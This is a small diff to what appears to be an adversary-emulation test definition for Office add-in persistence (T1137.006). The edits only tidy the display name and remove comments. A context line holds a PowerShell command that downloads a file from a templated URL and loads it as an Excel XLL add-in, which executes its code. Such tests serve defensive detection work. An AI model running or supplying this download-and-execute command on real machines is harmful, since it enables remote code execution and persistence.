@@ -1,5 +1,5 @@
 attack_technique: T1137.006
-display_name: Office Application Startup Add-ins
+display_name: 'Office Application Startup: Add-ins'
 
 atomic_tests:
 - name: Code Executed Via Excel Add-in File (Xll)
@@ -24,7 +24,7 @@ atomic_tests:
 
   executor:
     name: powershell
-    elevation_required: true # Indicates whether command must be run with admin privileges. If the elevation_required attribute is not defined, the value is assumed to be false.
-    command: | # These are the actaul attack commands, at least one command must be provided.
+    elevation_required: true 
+    command: |
       powershell -c "iwr -URI '#{xll_url}' -o '#{local_file}'; IEX ((new-object -ComObject excel.application).RegisterXLL('$env:tmp\HelloWorldXll.xll'))"
   
